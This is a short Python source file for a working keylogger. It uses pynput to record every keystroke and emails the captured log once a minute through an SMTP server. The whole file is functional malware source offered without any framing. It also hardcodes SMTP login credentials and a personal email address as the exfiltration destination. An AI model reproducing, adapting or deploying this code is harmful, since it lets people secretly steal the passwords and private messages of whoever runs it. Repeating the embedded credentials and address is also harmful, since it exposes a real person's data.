import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener
import time

smtp_server = 'sandbox.smtp.mailtrap.io'
smtp_port = 2525
smtp_username = '3eda4b5f427d50'
smtp_password = '60b2790ac0c7bf'

sender_email = 'giorgibakhturidze2202@gmail.com'
receiver_email = 'giorgibakhturidze2202@gmail.com'

def send_email(log):

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = 'log'

    body = log
    message.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.login(smtp_username, smtp_password)
            server.send_message(message)
    except:
        print('A')

def send_periodic_emails():
    global log
    while True:
        time.sleep(60 * 1)
        send_email(log)
        log = '';

log = '';

def on_press(key):
    global log
    if key == Key.enter:
        log += '[E]'
    elif key == Key.backspace:
        log += '[B]'
    elif len(str(key)) == 3:
        log += str(key).replace("'", "")

listener = Listener(on_press=on_press)
listener.start()

send_periodic_emails()